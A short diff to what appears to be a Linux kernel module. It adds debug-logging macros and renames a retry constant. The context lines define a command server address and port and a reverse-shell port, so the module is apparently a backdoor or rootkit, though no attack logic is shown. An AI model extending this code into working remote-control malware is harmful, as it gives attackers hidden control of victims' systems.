@@ -13,6 +13,20 @@
 #include <linux/uaccess.h>
 
 // Configuration macros
+#define DEBUG 1
+#define DBG_MSG(fmt, args...) \
+	do { \
+		if (DEBUG) { \
+			pr_info(fmt, ##args); \
+		} \
+	} while (0)
+#define ERR_MSG(fmt, args...) \
+	do { \
+		if (DEBUG) { \
+			pr_err(fmt, ##args); \
+		} \
+	} while (0)
+
 #define SERVER_IP "192.168.100.2"
 #define SERVER_PORT 4242
 #define REVERSE_SHELL_PORT 9001
@@ -21,7 +35,7 @@
 
 #define SUCCESS 0
 #define FAILURE 1
-#define MAX_SENDING_MSG_ATTEMPTS 10
+#define MAX_MSG_SEND_OR_RECEIVE_ERROR 10
 #define TIMEOUT_BEFORE_RETRY 1000
 #define RCV_CMD_BUFFER_SIZE 1024
 #define STD_BUFFER_SIZE 4096
